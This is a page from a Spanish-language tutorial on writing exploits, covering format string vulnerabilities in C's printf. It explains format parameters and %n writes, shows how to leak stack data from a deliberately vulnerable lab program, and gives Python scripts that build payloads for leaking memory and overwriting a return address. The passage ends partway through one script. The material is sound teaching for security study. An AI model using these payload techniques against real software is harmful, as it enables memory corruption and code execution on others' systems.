<!DOCTYPE html>
<html lang="en-us">

  <head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  <!-- Enable responsiveness on mobile devices-->
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  <title>
    
       &middot; Guía de exploits
    
  </title>

  <!-- CSS -->

  <link rel="stylesheet" href="/guia-escritura-exploits/public/css/poole.css">
  <link rel="stylesheet" href="/guia-escritura-exploits/public/css/syntax.css">
  <link rel="stylesheet" href="/guia-escritura-exploits/public/css/hyde.css">
  <link rel="stylesheet" href="http://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">

  <!-- Icons -->
  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/guia-escritura-exploits/public/apple-touch-icon-144-precomposed.png">
                                 <link rel="shortcut icon" href="/guia-escritura-exploits/public/favicon.ico">

  <!-- RSS -->
  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
</head>


  <body>

    <div class="sidebar">
 <!-- <div class="container sidebar-sticky">-->
  <div class="container sidebar">
    <div class="sidebar-about">
      <h1>
        <a href="/guia-escritura-exploits/">
          Guía de exploits
        </a>
      </h1>
      <!--<p class="lead"></p>-->
    </div>

    <nav class="sidebar-nav">

     <!-- <a class="sidebar-nav-item" href="/guia-escritura-exploits/">Home</a>-->

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/buffer-overflow/index.html">Buffer Overflow</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/1-introduccion.html">Nivel 1 | Teoría</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/1-practica.html">Nivel 1 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/2-shellcode.html">Nivel 2 | Shellcode</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/2-practica.html">Nivel 2 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/3-got.html">Nivel 3 | GOT</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/3-practica.html">Nivel 3 | Práctica</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/buffer-overflow/4-practica.html">Nivel 4 | Práctica</a>

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/format-string/index.html">Format String</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/format-string/5-format-string.html">Nivel 5 | Format strings</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/format-string/5-practica.html">Nivel 5 | Práctica</a>

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/esoteric/index.html">Esoteric</a>

        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/esoteric/6-ret2libc.html">Nivel 6 | Return to libc</a>        
        <a class="sidebar-nav-item sidebar-sub-item" href="/guia-escritura-exploits/esoteric/6-practica.html">Nivel 6 | Práctica</a>

        <a class="sidebar-nav-item" href="/guia-escritura-exploits/configuracion.html">Configuración</a>
        <a class="sidebar-nav-item" href="/guia-escritura-exploits/herramientas.html">Herramientas</a>


      <!--<a class="sidebar-nav-item" href="/archive/v2.1.0.zip">Descargar PDF</a>-->
      <a class="sidebar-nav-item" href="https://github.com/fundacion-sadosky/guia-escritura-exploits">Proyecto en GitHub</a>
    </nav>

    <p class="sidebar-nav-item footer">Basado en los <a href="https://github.com/gerasdf/InsecureProgramming/">abos de Gera</a></br> Teresa Alberto | STIC, Fundación Sadosky  </br> <a href="https://github.com/fundacion-sadosky/guia-escritura-exploits/blob/master/LICENSE">GNU GPL</a> | 2018</p>
  </div>
</div>


    <div class="content container">
      <div class="page">
  <!--<h1 class="page-title"></h1>-->
  <h1 id="vulnerabilidades-format-string">Vulnerabilidades Format String</h1>
<p>Este exploit consiste en aprovecharse de funciones que imprimen texto con formato.</p>

<h2 id="funciones-de-formato">Funciones de formato</h2>
<p>En C existen varias funciones que dan formato a tipos de datos primitivos y lo escriben por una salida, por ejemplo, por salida estándar para imprimirlo en la terminal.</p>

<div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@abos:~$</span> man 3 <span class="nb">printf</span>
<span class="go">
</span><span class="gp">int printf(const char *format, ...);</span>
<span class="gp">int fprintf(FILE *stream, const char *format, ...);</span>
<span class="gp">int sprintf(char *str, const char *format, ...);</span>
<span class="gp">int snprintf(char *str, size_t size, const char *format, ...);</span>
</code></pre></div></div>

<h2 id="cadena-de-formato-o-format-string">Cadena de formato (o format string)</h2>
<p>Parte de su vulnerabilidad se ve provocada por el hecho de que son funciones con argumentos variables. Por ejemplo, la función <code class="highlighter-rouge">printf(const char* format, ...)</code> requiere de un primer parámetro denominado <strong>format string</strong> o <strong>cadena de formato</strong>, seguida por 0 o más argumentos.</p>

<p>El format string es la cadena a mostrar. Se compone, por un lado, de caracteres ordinarios (exceptuando -por ejemplo- el caracter reservado <code class="highlighter-rouge">%</code>) que se copian sin cambios a la salida y, por otro, de parámetros de formato que comienzan con el simbolo <code class="highlighter-rouge">%</code> seguido de un indicador de conversión (<code class="highlighter-rouge">%d</code> o <code class="highlighter-rouge">%x</code> por ejemplo). De esta manera el format string da la pauta de la cantidad de argumentos que serán representados en la salida.   <br />
Cuando se detecta en el format string un símbolo <code class="highlighter-rouge">%</code> se busca el siguiente argumento de la función y se lo convierte a la representación indicada por el parámetro de formato (sea <code class="highlighter-rouge">%x</code>, <code class="highlighter-rouge">%d</code>, etc) y así sucesivamente.</p>

<p>Por ejemplo en <code class="highlighter-rouge">printf ("El año %d", 1984)</code> el format string <code class="highlighter-rouge">"El año %d"</code> tiene un único parámetro de formato <code class="highlighter-rouge">%d</code>. Inicialmente la función imprime el string “El año “, se detiene en <code class="highlighter-rouge">%d</code> y busca en la pila el siguiente argumento que lo reemplazará, en este caso “<code class="highlighter-rouge">1984</code>”. Lo procesa como decimal resultando en la sálida: <strong>“El año 1984”</strong>.</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">printf</span> <span class="p">(</span><span class="s">"El año %d."</span><span class="p">,</span> <span class="mi">1984</span><span class="p">)</span>

<span class="n">El</span> <span class="n">a</span><span class="err">ñ</span><span class="n">o</span> <span class="mi">1984</span><span class="p">.</span>

</code></pre></div></div>
<p>En cambio si el parámetro indicara una conversión a la representación hexadecimal se obtendría el siguiente resultado:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">printf</span> <span class="p">(</span><span class="s">"El número %d en representación hexadecimal es: %x."</span><span class="p">,</span> <span class="mi">1984</span><span class="p">,</span> <span class="mi">1984</span><span class="p">)</span>

<span class="n">El</span> <span class="n">n</span><span class="err">ú</span><span class="n">mero</span> <span class="mi">1984</span> <span class="n">en</span> <span class="n">representaci</span><span class="err">ó</span><span class="n">n</span> <span class="n">hexadecimal</span> <span class="n">es</span><span class="o">:</span> <span class="mi">7</span><span class="n">C0</span><span class="p">.</span>

</code></pre></div></div>

<h2 id="parámetros-de-formato">Parámetros de formato</h2>
<p>La siguiente tabla especifica los diferentes tipos de parámetros de formato y cómo se pasan a la función <code class="highlighter-rouge">printf()</code> sea como valor o como puntero.</p>

<table>
  <thead>
    <tr>
      <th>Parámetro</th>
      <th>Salida</th>
      <th>Cómo se pasa a la función</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>%d</td>
      <td>int	(decimal)</td>
      <td>Por valor</td>
    </tr>
    <tr>
      <td>%u</td>
      <td>unsigned int (decimal)</td>
      <td>Por valor</td>
    </tr>
    <tr>
      <td>%x</td>
      <td>unsigned int (hexadecimal)</td>
      <td>Por valor</td>
    </tr>
    <tr>
      <td>%s</td>
      <td>char * (string)</td>
      <td>Por referencia</td>
    </tr>
    <tr>
      <td>%n</td>
      <td>int *</td>
      <td>Por referencia</td>
    </tr>
  </tbody>
</table>

<p>Hay dos tipos de parámetros:</p>
<ol>
  <li><strong>De lectura</strong> (como <code class="highlighter-rouge">%s, %d, %x</code>): dan formato a la salida de acuerdo al parámetro de formato.</li>
  <li><strong>De escritura</strong> (como <code class="highlighter-rouge">%n</code>): el parámetro <code class="highlighter-rouge">%n</code> toma una dirección como argumento dónde almacena la cantidad de bytes escritos hasta ese punto. La utilidad de este parámetro radica en conocer la longitud del output con formato, como por ejemplo en el siguiente programa:
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">contador</span><span class="p">;</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"%s%n</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"012345"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">contador</span><span class="p">);</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"contador = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">contador</span><span class="p">);</span>

<span class="n">user</span><span class="err">@</span><span class="n">abos</span><span class="o">:~</span><span class="err">$</span> <span class="p">.</span><span class="o">/</span><span class="n">contador</span> 
<span class="mo">012345</span>
<span class="n">contador</span> <span class="o">=</span> <span class="mi">6</span>
</code></pre></div>    </div>

    <p>El parámetro <code class="highlighter-rouge">%n</code> escribe en 4 bytes la cantidad de caracteres impresos por salida estándar. Como se imprimieron seis caracteres en total (“012345”), va a escribir 0x00000006 dentro de la variable contador. En cambio <code class="highlighter-rouge">%hn</code> (con una <code class="highlighter-rouge">h</code> de <em>half</em> como formato adicional de longitud) escribe esa cantidad en un short de 2 bytes, es decir 0x0006. Obviamente el parámetro <code class="highlighter-rouge">%hhn</code> lo hará en un único byte: 0x06.</p>
  </li>
</ol>

<p>También existen otras opciones de formato opcionales:</p>
<ol>
  <li><strong>Nro. argumento</strong>: <code class="highlighter-rouge">%&lt;nro argumento&gt;$parametro</code>   <br />
Por ejemplo <code class="highlighter-rouge">%2$d</code> imprime el segundo argumento que se le haya pasado a la función. Por ejemplo en el caso: <code class="highlighter-rouge">printf("Este es el segundo argumento %2$d", 0, 1, 2)</code> imprime directamente <code class="highlighter-rouge">1</code>.</li>
  <li><strong>Longitud</strong>: <code class="highlighter-rouge">%&lt;longitud&gt;parametro</code>   <br />
Para ello se usa la <code class="highlighter-rouge">h</code> de <em>half</em> y <code class="highlighter-rouge">hh</code> de <em>half of the half</em>. Por ejemplo, como vimos <code class="highlighter-rouge">%n</code> escribe la cantidad de caracteres impresos dentro de 4 bytes, pero al agregar un formato de longitud: <code class="highlighter-rouge">%hn</code> los escribe dentro de 2 bytes y <code class="highlighter-rouge">%hhn</code> en un byte.</li>
  <li><strong>Padding</strong>: <code class="highlighter-rouge">%&lt;padding&gt;parametro</code>   <br />
Por ejemplo <code class="highlighter-rouge">%3d</code> procesa el valor como decimal y agrega espacios si su longitud no llega a 3 caracteres. En cambio con <code class="highlighter-rouge">%03d</code> se reemplazan los espacios por ceros en longitudes menores a 3.    <br />
Como veremos más adelante el padding se va a utilizar frecuentemente en la escritura de exploits junto al parámetro <code class="highlighter-rouge">%n</code>, ya que el padding permite adecuar la cantidad de caracteres impresos que el <code class="highlighter-rouge">%n</code> va a escribir.
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">num</span><span class="o">=</span><span class="mh">0x8</span><span class="p">;</span>
   
<span class="n">printf</span><span class="p">(</span><span class="s">"%d%n</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">num</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">contador</span><span class="p">)</span>    <span class="err">#</span> <span class="n">imprime</span> <span class="s">"8"</span><span class="p">;</span> <span class="n">contador</span> <span class="o">=</span> <span class="mi">1</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"%3d%n</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">num</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">contador</span><span class="p">)</span>   <span class="err">#</span> <span class="n">imprime</span> <span class="s">"   8"</span><span class="p">;</span> <span class="n">contador</span> <span class="o">=</span> <span class="mi">3</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"%9d%n</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">num</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">contador</span><span class="p">)</span>   <span class="err">#</span> <span class="n">imprime</span> <span class="s">"        8"</span><span class="p">;</span> <span class="n">contador</span> <span class="o">=</span> <span class="mi">9</span>
</code></pre></div>    </div>
    <p>En el ejemplo se observa cómo al agregar el número 9 al format string <code class="highlighter-rouge">%9d%n</code> se modificó arbitrariamente el valor del contador sin más complicaciones.   <br />
También es posible aprovechar este recurso para facilitar la visualización de los datos. Por ejemplo si se trata de direcciones, con el format string <code class="highlighter-rouge">%08x</code> imprimimos valores en hexadecimal con un padding de 8 digitos.</p>
    <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">printf</span><span class="p">(</span><span class="s">"%x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">dato</span><span class="p">)</span>    <span class="err">#</span> <span class="n">imprime</span> <span class="s">"2ad"</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"%8x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">dato</span><span class="p">)</span>   <span class="err">#</span> <span class="n">imprime</span> <span class="s">"     2ad"</span>
<span class="n">printf</span><span class="p">(</span><span class="s">"%08x</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">dato</span><span class="p">)</span>  <span class="err">#</span> <span class="n">imprime</span> <span class="s">"000002ad"</span>
</code></pre></div>    </div>
  </li>
</ol>

<h2 id="el-papel-de-la-pila">El papel de la pila</h2>
<p>El siguiente ejemplo fue tomado de <a href="#material-consultado">SkullSecurity</a>.</p>

<p>El manejo de la pila en el llamado a función <code class="highlighter-rouge">printf("Una cadena %s y un número %d", str, numero)</code> en pseudo assembler es:</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">push</span> <span class="n">numero</span>
<span class="k">push</span> <span class="k">str</span>
<span class="k">push</span> <span class="s">"Una cadena %s y un número %d"</span>
<span class="k">call</span> <span class="n">printf</span>
<span class="k">add</span> <span class="n">esp</span><span class="p">,</span> <span class="mh">0xc</span>
</code></pre></div></div>
<p>Es decir, se almacenan los 3 argumentos de <code class="highlighter-rouge">printf()</code> en orden inverso (incluyendo el format string) tal como indica la <a href="/guia-escritura-exploits/buffer-overflow/1-introduccion.html#call-y-convenci%C3%B3n-del-llamado-a-funciones">convención del llamado a funciones</a>. Después se llama a <code class="highlighter-rouge">printf()</code> y cuando esta función retorna, se restan los 12 bytes usados para los argumentos (<code class="highlighter-rouge">add esp, 0xc</code>).</p>

<p>Es importante aclarar que cuando <code class="highlighter-rouge">printf()</code> es llamada la función no conoce cuantos argumentos recibió sino que da por sentado que la pila está correctamente construida e infiere el número de argumentos por la cantidad de parámetros de formato (<code class="highlighter-rouge">%...</code>) presentes en el format string. Entonces esta función toma el format string que se le dió como argumento y lo imprime hasta llegar a especificadores comenzados por <code class="highlighter-rouge">%</code>, a los que reemplaza por contenido que toma de la pila. <code class="highlighter-rouge">printf()</code> sigue al pié de la letra lo indicado por el format string sin importar lo que se encuentre almacenado efectivamente en la pila, a la que considera meramente un cúmulo de datos.</p>

<p>Si consideramos el siguiente programa:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
</span>
<span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"%x %x %x</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Lo compilamos y ejecutamos:</p>
<div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@abos:~$</span> ./test
<span class="go">bffff7a4 bffff7ac b7e563fd
</span></code></pre></div></div>

<p>¿A dónde fue a parar el string “%x” y por qué aparecen números? Aunque <code class="highlighter-rouge">printf()</code> tenía como único argumento el format string “<code class="highlighter-rouge">%x %x %x\n</code>”, por cada parámetro <code class="highlighter-rouge">%x</code> buscó datos de la pila y los imprimió asumiendo que fue llamada con un número mayor de argumentos.</p>

<p>Para ver el estado de la pila con el llamado a <code class="highlighter-rouge">printf()</code> va a ser de utilidad incluir variables locales, cuya ubicación en la pila es conocida. Entonces complejizamos el ejemplo:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="n">funcion_a</span><span class="p">(</span><span class="kt">int</span> <span class="n">param_b</span><span class="p">,</span> <span class="kt">int</span> <span class="n">param_c</span><span class="p">){</span>
  <span class="kt">int</span> <span class="n">var_local</span> <span class="o">=</span> <span class="mh">0x123</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">str</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="s">"AAAABBBBCCCC"</span><span class="p">;</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"%x %x %x %x %x %x %x</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[]){</span>
  <span class="n">funcion_a</span><span class="p">(</span><span class="mh">0x1000</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Cuando se hace el llamado a la <code class="highlighter-rouge">funcion_a(0x1000,0x10)</code> el pseudo assembler que manipula la pila es el siguiente:</p>
<div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">;</span> llamado a funcion_a<span class="o">(</span>0x1000, 0x10<span class="o">)</span>
<span class="go">
   push 0x10
   push 0x1000
</span><span class="gp">=&gt;</span> call funcion_a
<span class="go">   add esp, 8
</span></code></pre></div></div>

<p>Y al ejecutar la instrucción de <code class="highlighter-rouge">call funcion_a</code> el estado de la pila es el siguiente:</p>

<p><img src="/guia-escritura-exploits/format-string/imagenes/teoria/pila-printf.png" alt="pila" /></p>

<p>El pseudo assembler de <code class="highlighter-rouge">funcion_a</code>:</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="n">func_a</span><span class="o">&gt;:</span>
   <span class="k">push</span>   <span class="n">ebp</span>                             <span class="c">; backup viejo frame pointer</span>
   <span class="k">mov</span>    <span class="n">ebp</span><span class="p">,</span><span class="n">esp</span>                         <span class="c">; seteo nuevo frame pointer</span>
   <span class="k">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x10</span>                        <span class="c">; espacio para 16 bytes de var locales</span>

   <span class="k">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x4</span><span class="err">]</span><span class="p">,</span><span class="mh">0x123</span> 		
   <span class="k">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x8</span><span class="err">]</span><span class="p">,</span><span class="mh">0x41414141</span>  <span class="c">; "AAAA"</span>
   <span class="k">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0xc</span><span class="err">]</span><span class="p">,</span><span class="mh">0x42424242</span>  <span class="c">; "BBBB"</span>
   <span class="k">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">ebp</span><span class="o">-</span><span class="mh">0x10</span><span class="err">]</span><span class="p">,</span><span class="mh">0x43434343</span> <span class="c">; "CCCC"</span>

   <span class="k">push</span>   <span class="mh">0x80484d0</span>                       <span class="c">; format string "%x %x %x %x %x %x %x\n"</span>
<span class="o">=&gt;</span> <span class="k">call</span>   <span class="mi">80482</span><span class="n">d0</span> <span class="o">&lt;</span><span class="n">printf</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>            <span class="c">; llamado a printf()				</span>
   <span class="k">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x4</span>                         <span class="c">; elimino el format string de la pila</span>

   <span class="k">add</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0x10</span>                        <span class="c">; elimino var locales de la pila</span>
   <span class="k">pop</span>    <span class="n">ebp</span>                             <span class="c">; restauro viejo frame pointer  </span>
   <span class="k">ret</span>    
</code></pre></div></div>

<p>En el instante anterior a llamar a <code class="highlighter-rouge">printf()</code> el estado de la pila es:</p>

<p><img src="/guia-escritura-exploits/format-string/imagenes/teoria/pila-printf-2.png" alt="pila" /></p>

<p>Y cuando se llama a <code class="highlighter-rouge">printf()</code> se apila la dirección de retorno y se mapea dentro de la pila cada uno de los <code class="highlighter-rouge">%x</code> de la siguiente manera:</p>

<p><img src="/guia-escritura-exploits/format-string/imagenes/teoria/pila-printf-3.png" alt="pila" /></p>

<p>Es posible confirmar esto ejecutando el programa y observando los datos de la pila que se imprimen:</p>
<div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@abos:~$</span> ./test
<span class="go">41414141 42424242 43434343 123 bffff718 804843b 1000
</span></code></pre></div></div>

<p>La función <code class="highlighter-rouge">printf("%x %x %x %x %x %x %x\n")</code> busca en la pila esos 7 argumentos aunque no se hayan definido sus valores de manera explícita bajo la forma <code class="highlighter-rouge">printf("%x %x %x %x %x %x %x\n", valor1, valor2 ...)</code>. E imprime el contenido de la pila por salida estándar representado en hexadecimal.</p>

<h2 id="cómo-funcionan-las-vulnerabilidades-del-tipo-format-string">¿Cómo funcionan las vulnerabilidades del tipo format string?</h2>
<p>La clave es directa o indirectamente controlar la cadena de formato. Códigos como <code class="highlighter-rouge">printf(foo)</code> son vulnerables si suponemos que <code class="highlighter-rouge">foo</code> se toma de un input de usuario que podrá contener parámetros de formato %. Al ser funciones con argumentos variables si se introduce <code class="highlighter-rouge">%s %x %n</code> como argumento, se forzará a que la función <code class="highlighter-rouge">printf("%s %x %n")</code> busque en la pila esos 3 argumentos (por su valor o su referencia según corresponda) y los imprima por salida estándar.</p>

<h3 id="filtración-de-datos-en-la-pila">Filtración de datos en la pila</h3>
<p>Cuando controlamos la cadena de formato es posible filtrar datos de la pila del proceso. Así una vulnerabilidad de format string puede ser un primer paso para detectar una dirección de retorno que pueda usarse en un desbordamiento de búfer. O incluso para filtrar el valor del <a href="/guia-escritura-exploits/configuracion.md#deshabilitar-canary-de-protecci%C3%B3n-de-la-pila"><em>canario</em> de la pila</a>.</p>

<p>Por ejemplo si controlamos el format string gracias al código <code class="highlighter-rouge">printf(argv[1])</code> podemos pasar los siguientes inputs:</p>
<ol>
  <li><code class="highlighter-rouge">printf("%x")</code>: si damos como input el string <code class="highlighter-rouge">"%x"</code> logramos imprimir 4 bytes de la pila bajo la representación hexadecimal.</li>
  <li><code class="highlighter-rouge">printf("%s")</code>: si ingresamos como input el string <code class="highlighter-rouge">"%s"</code> la funcion toma 4 bytes de la pila, la considera un puntero a un string e imprime la memoria a la que apunta.</li>
</ol>

<p>Ejemplo tomado de <a href="#material-consultado">Exploit Exercises</a></p>
<pre><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void vuln(char *string){
  printf(string);
}
  
int main(int argc, char **argv){
  vuln(argv[1]);
}
</code></pre>

<p>Lo compilamos y ejecutamos con los siguientes argumentos.</p>
<div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@abos:~$</span> ./protostar1 AAAA
<span class="go">AAAA
</span><span class="gp">user@abos:~$</span> ./protostar1 %x %x %x
<span class="go">bffff6c8 804841c bffff89c 
</span></code></pre></div></div>
<p>Vemos que al pasarle el parámetro <code class="highlighter-rouge">%x</code> retieradas veces logramos imprimir el contenido de la pila del proceso.</p>

<p>En muchos casos nos va a interesar imprimir el format string mismo, ya que si logramos imprimir un string que controlamos vamos a poder escribir en un string (o mejor dicho en una dirección) que controlamos.    <br />
Para imprimir el contenido de la pila hasta ver el propio format string que proveemos como parámetro, armamos un input más extenso con un comienzo reconocible (<code class="highlighter-rouge">\x41\x41\x41\x41...</code>). Incluimos el parámetro con padding <code class="highlighter-rouge">"%08x"</code> para visualizar más cómodamente los datos:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>

<span class="kn">import</span> <span class="nn">sys</span>

<span class="k">def</span> <span class="nf">pad</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>                                <span class="c">#padding</span>
    <span class="k">return</span> <span class="p">(</span><span class="n">s</span> <span class="o">+</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">1000</span><span class="p">)[:</span><span class="mi">1000</span><span class="p">]</span>        

<span class="n">exploit</span> <span class="o">=</span> <span class="s">"AAAAAAAAAAAAAAAAAAAAAAAAAAA"</span>    <span class="c">#comienzo del format string reconocible</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%08</span><span class="s">x ."</span> <span class="o">*</span> <span class="mi">150</span>                  <span class="c">#parámetros para imprimir la pila</span>

<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">pad</span><span class="p">(</span><span class="n">exploit</span><span class="p">))</span>

</code></pre></div></div>
<p>Inspeccionamos el output hasta encontrar el comienzo del format string:</p>
<div class="language-shell_session highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">user@abos:~$</span> ./r.sh gdb ./protonstar1
<span class="gp">(gdb) r "$</span><span class="o">(</span>./exploit.py<span class="o">)</span><span class="s2">"
</span></code></pre></div></div>
<p><img src="/guia-escritura-exploits/format-string/imagenes/teoria/debug-protonstar-3.png" alt="debug" /></p>

<p>Los valores <code class="highlighter-rouge">\x41\x41\x41\x41...</code> resaltados son el comienzo del format string (dejamos de lado las primeras dos “AA” por una cuestión de alineamiento). Ello indica que uno de los parámetros <code class="highlighter-rouge">"%08x"</code> logra imprimir la parte de la pila en la que está almacenado el format string que ingresamos como usuario.</p>

<blockquote>
  <p><strong>Consideraciones</strong>:</p>
</blockquote>

<blockquote>
  <ul>
    <li>Padding: la función <code class="highlighter-rouge">pad(s)</code> se creó para que <code class="highlighter-rouge">printf()</code> siempre reciba un input de igual longitud. Esto se debe a que los argumentos se almacenan en la pila antes del llamado a una función, por lo que modificar su longitud hará que la configuración inicial de la pila del programa cambie.   <br />
 Para simplificar los cálculos en el offset del exploit debemos controlar la cantidad de datos en la pila y por ende es clave siempre ingresar un input siempre de igual longitud.</li>
  </ul>
</blockquote>

<h3 id="escritura-en-cualquier-ubicación-de-memoria">Escritura en cualquier ubicación de memoria</h3>
<p>Imprimir memoria de la pila con <code class="highlighter-rouge">%x</code> permite filtrar información relevante, pero también facilita futuros cálculos necesarios para lograr un ataque más sofisticado. El punto clave es conocer cuál de los parámetros <code class="highlighter-rouge">%08x</code> es el que imprime el comienzo del format string. Si contamos con esa información podemos incluir al principio del format string ya no <code class="highlighter-rouge">"AAAA..."</code> sino una dirección cuyo contenido querramos inspeccionar o en la cual querramos escribir un valor.   <br />
Con este objetivo, primero debemos identificar ese parámetro <code class="highlighter-rouge">%08x</code> que imprime el comienzo del format string. Y luego lo reemplazamos por <code class="highlighter-rouge">%s</code> o <code class="highlighter-rouge">%n</code> para inspeccionar o imprimir en esa dirección de memoria.</p>

<p>En este caso el objetivo será escribir en un sector de la pila y ya no sólo imprimir su contenido. Siguiendo con el mismo programa de ejemplo, suponemos un escenario en el que queremos sobreescribir una dirección de retorno para reemplazarla -por ejemplo- por la dirección de nuestro shellcode. Supongamos que esa dirección de retorno está almacenada en la pila en la dirección <code class="highlighter-rouge">0xbffff364</code>, lo primero que hacemos es incluir esa dirección al comienzo del format string:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>

<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>

<span class="k">def</span> <span class="nf">pad</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>                       <span class="c">#evita variaciones en pila por long. de input</span>
    <span class="k">return</span> <span class="p">(</span><span class="n">s</span> <span class="o">+</span> <span class="s">"A"</span><span class="o">*</span><span class="mi">1000</span><span class="p">)[:</span><span class="mi">1000</span><span class="p">]</span>        

<span class="n">ret_addr</span> <span class="o">=</span> <span class="mh">0xbffff364</span>             <span class="c">#addr a sobreescribir</span>

<span class="n">exploit</span>  <span class="o">=</span> <span class="s">"AA"</span>                   <span class="c">#alineacion de ret_addr</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="n">ret_addr</span><span class="p">)</span>   <span class="c">#incluimos ret_addr en format string</span>
<span class="n">exploit</span> <span class="o">+=</span> <span class="s">"</span><span class="si">%08</span><span class="s">x ."</span> <span class="o">*</span> <span class="mi">150</span>

